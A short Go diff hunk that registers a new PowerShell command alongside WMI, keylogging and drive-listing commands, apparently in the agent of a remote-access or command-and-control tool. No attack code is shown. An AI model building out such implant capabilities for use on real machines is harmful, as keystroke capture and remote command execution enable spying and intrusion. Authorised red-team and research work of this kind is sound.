@@ -32,4 +32,5 @@ func registerPlatformCommands() {
 	RegisterCommand(&WmiCommand{})
 	RegisterCommand(&KeylogCommand{})
 	RegisterCommand(&DrivesCommand{})
+	RegisterCommand(&PowershellCommand{})
 }
